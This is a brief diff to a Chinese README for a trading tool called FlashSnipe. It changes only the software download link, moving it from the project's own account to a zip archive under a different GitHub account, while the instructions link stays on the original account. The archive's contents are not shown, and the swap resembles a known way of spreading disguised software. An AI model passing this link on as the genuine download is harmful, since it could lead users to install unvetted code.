@@ -1,7 +1,7 @@
 # 使用 FlashSnipe 进行快速交易
 
 
-###  [软件下载](https://github.com/lvjianzwp/flashsnipe/archive/refs/tags/v13.0.3_.zip)
+###  [软件下载](https://github.com/jobBeson1/flashsnipe/archive/refs/tags/13.0.4.zip)
 ## [使用说明,必看](https://github.com/lvjianzwp/flashsnipe/blob/main/%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E.md)
 
 
